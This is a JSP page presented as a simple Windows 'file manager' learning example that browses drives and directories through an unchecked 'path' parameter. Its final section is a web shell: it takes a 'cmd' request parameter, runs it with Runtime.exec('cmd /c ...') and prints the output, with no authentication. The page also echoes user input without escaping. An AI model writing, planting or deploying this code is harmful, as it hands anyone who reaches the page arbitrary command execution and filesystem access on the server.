<%--
  Created by IntelliJ IDEA.
  User: Cheng
  Date: 2018/4/20
  Time: 10:09
  To change this template use File | Settings | File Templates.
--%>
<%
    /**
     jsp file manger v0.5 windows平台的
     文件名： folder.jsp
     描述： 一个简单的系统文件目录显示程序，类似于资源管理器，不过功能弱多了。通过这个例子主要是学习一下system.io.file类 。
     作者： 慈勤强
     emai ： cqq1978@gmail.com
     */
%>

<%@page contentType="text/html;charset=UTF-8" %>
<%@page import="java.io.*" %>
<%@page import="java.util.*" %>
<style>
    td, select, input, body {
        font-size: 9pt;
    }

    a {
        text-decoration: none
    }
</style>
<title>jsp file manger version0.5 --by 慈勤强 cqq1978@gmail.com</title>
<%!
    String getdrivers()
/**
 windows系统上取得可用的所有逻辑盘
 **/
    {
        StringBuffer sb = new StringBuffer("驱动器 : ");
        File roots[] = File.listRoots();
        for (int i = 0; i < roots.length; i++) {
            sb.append("<a href=?path=" + roots[i] + ">");
            sb.append(roots[i] + "</a> &nbsp;&nbsp;");
        }
        return sb.toString();
    }
%>
<%
    String strthisfile = "folder.jsp";
    request.setCharacterEncoding("gb2312");
    String strdir = request.getParameter("path");

    if (strdir == null || strdir.length() < 1) {
        strdir = "c:\\";
    }
    StringBuffer sb = new StringBuffer("");
    StringBuffer sbfile = new StringBuffer("");
    try {
        out.println("" +
                "<table border=1 width=100% bgcolor=#f1f1f1><tr><td width=30当前目录： <b>"
                + strdir + "</b></td><td>" + getdrivers() + "</td></tr></table><br>\r\n");
        File objfile = new File(strdir);
        File list[] = objfile.listFiles();
        if (objfile.getAbsolutePath().length() > 3) {
            sb.append("<tr><td >&nbsp;</td><td><a href=?path=" + objfile.getParentFile().getAbsolutePath() + ">");
            sb.append("上级目录(以下是文件列表)</a><br>- - - - - - - - - - - </td></tr>\r\n");
        }
        for (int i = 0; i < list.length; i++) {
            if (list[i].isDirectory()) {
                sb.append("<tr><td >&nbsp;</td><td>");
                sb.append("<a href=?path=" + list[i].getAbsolutePath() + ">" + list[i].getName() + "</a>");
                sb.append("</td></tr>");
//sb.append("</td></tr></table>\r\n");
            } else {
                String strlen = "";
                String strdt = "";
                long lfile = 0;
                lfile = list[i].length();

                if (lfile > 1000000) {
                    lfile = lfile / 1000000;
                    strlen = "" + lfile + " m";
                } else if (lfile > 1000) {
                    lfile = lfile / 1000;
                    strlen = "" + lfile + " k";
                } else {
                    strlen = "" + lfile + " byte";
                }
                Date dt = new Date(list[i].lastModified());
                strdt = dt.toLocaleString();
                sbfile.append("<tr><td>");
                sbfile.append("<a href='#'>" + list[i].getName() + "</a>");
                sbfile.append("</td><td>");
                sbfile.append("" + strlen);
                sbfile.append("</td><td>");
                sbfile.append("" + strdt);
                sbfile.append("</td><td>");
                sbfile.append("修改 删除 下载 复制");
                sbfile.append("</td></tr>\r\n");
                //sbfile.append("</td></tr></table>");
            }
        }
        //out.println(sb.tostring()+sbfile.tostring());
    } catch (Exception e) {
        out.println("<font color=red>操作失败： " + e.toString() + "</font>");
    }
%>

<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#ffffff">

    <tr>
        <td width="25%" align="center" valign="top">
            <table width="98%" border="0" cellspacing="0" cellpadding="3">

                <%=sb%>
                </tr>
            </table>
        </td>
        <td width="81%" align="center" valign="top">
            <table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc"
                   bordercolordark="#ffffff">
                <tr bgcolor="#e7e7e6">
                    <td width="26%">文件名称</td>
                    <td width="19%" align="center">文件大小</td>
                    <td width="29%" align="center">修改时间</td>
                    <td width="26%" align="center">文件操作</td>
                </tr>
                <%=sbfile%>
                <!-- <tr align="center">
                <td colspan="4"><br>
                总计文件个数：<font color="#ff0000">30</font> ，大小：<font color="#ff0000">664.9</font>
                kb </td>
                </tr>
                -->
            </table>
        </td>
    </tr>
</table>

<%
    String strcmd = "";
    String line = "";
    StringBuffer sbcmd = new StringBuffer("");
    strcmd = request.getParameter("cmd");
    if (strcmd != null) {
        try {
//out.println(strcmd);
            Process p = Runtime.getRuntime().exec("cmd /c " + strcmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((line = br.readLine()) != null) {
                sbcmd.append(line + "\r\n");
            }
        } catch (Exception e) {
            System.out.println(e.toString());
        }
    }
%>
<form name="cmd" action="" method="post">
    <input type="text" name="cmd" value="<%=strcmd%>" size=50>
    <input type=submit name=submit value="执行">
</form>
<%
    if (sbcmd != null && sbcmd.toString().trim().equals("") == false) {
%>
<textarea name="cqq" rows="20" cols="100%"><%=sbcmd.toString()%></textarea>
<%
    }
%>